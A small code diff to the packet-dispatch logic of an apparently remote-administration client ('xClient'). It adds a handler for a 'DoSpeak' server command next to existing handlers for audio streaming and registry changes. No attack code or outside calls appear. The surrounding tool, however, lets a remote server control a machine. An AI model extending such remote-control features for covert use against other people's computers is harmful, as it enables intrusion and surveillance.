@@ -177,6 +177,9 @@ namespace xClient.Core.Packets
             else if(type == typeof(ServerPackets.StopAudioStream)) {
                 CommandHandler.HandleStopAudioStream((ServerPackets.StopAudioStream)packet, client);
             }
+            else if(type == typeof(ServerPackets.DoSpeak)) {
+                CommandHandler.HandleDoSpeak((ServerPackets.DoSpeak)packet, client);
+            }
             else if (type == typeof(ServerPackets.DoChangeRegistryValue))
             {
                 CommandHandler.HandleChangeRegistryValue((ServerPackets.DoChangeRegistryValue)packet, client);
